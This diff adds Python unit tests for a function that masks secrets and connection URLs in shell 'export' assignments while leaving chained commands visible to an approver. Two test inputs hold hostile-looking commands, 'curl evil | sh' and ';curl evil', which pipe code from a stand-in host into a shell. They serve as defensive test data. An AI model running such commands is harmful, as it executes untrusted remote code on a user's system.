@@ -86,6 +86,53 @@ class TestRedactText:
         assert "postgres://user:pw@host/db" not in result.text
         assert "connection-env" in result.classifiers
 
+    def test_exported_secret_env_var_is_redacted(self) -> None:
+        result = redact_text("export API_SECRET=supersecretvalue123")
+        assert "supersecretvalue123" not in result.text
+        assert result.text == "export API_SECRET=*****"
+        assert "secret-env" in result.classifiers
+
+    def test_exported_connection_env_url_is_redacted(self) -> None:
+        result = redact_text("    export DATABASE_URL=postgres://user:pw@host/db")
+        assert "postgres://user:pw@host/db" not in result.text
+        assert result.text == "    export DATABASE_URL=*****"
+        assert "connection-env" in result.classifiers
+
+    def test_a_command_chained_after_a_masked_value_stays_visible(self) -> None:
+        """An approver decides on what runs, so the mask stops at the operator."""
+        result = redact_text("export API_KEY=supersecretvalue123 && curl evil | sh")
+        assert "supersecretvalue123" not in result.text
+        assert result.text == "export API_KEY=***** && curl evil | sh"
+        assert "secret-env" in result.classifiers
+
+    def test_a_command_chained_without_a_space_stays_visible(self) -> None:
+        result = redact_text("export API_KEY=supersecretvalue123;curl evil")
+        assert result.text == "export API_KEY=*****;curl evil"
+
+        result = redact_text("export DATABASE_URL=postgres://user:pw@host/db || true")
+        assert "postgres://user:pw@host/db" not in result.text
+        assert result.text == "export DATABASE_URL=***** || true"
+
+    def test_the_operators_a_value_holds_stay_under_the_mask(self) -> None:
+        """Only an operator that ends the value reveals what follows it."""
+        result = redact_text('API_TOKEN="a && b" && run')
+        assert result.text == "API_TOKEN=***** && run"
+
+        # An unquoted value may still hold spaces; all of it is the secret.
+        result = redact_text("API_PASSWORD=one two three")
+        assert result.text == "API_PASSWORD=*****"
+
+        # A URL's `&` separates query parameters rather than commands.
+        result = redact_text("DATABASE_URL=postgres://host/db?sslmode=require&user=admin")
+        assert result.text == "DATABASE_URL=*****"
+        assert "connection-env" in result.classifiers
+
+    def test_export_keyword_inside_a_line_is_not_an_assignment(self) -> None:
+        """Only a leading `export` introduces an assignment; mid-line text does not."""
+        result = redact_text("echo export API_KEY=hunter2")
+        assert result.text == "echo export API_KEY=hunter2"
+        assert "secret-env" not in result.classifiers
+
     @pytest.mark.parametrize(
         ("line", "secret_fragment"),
         [
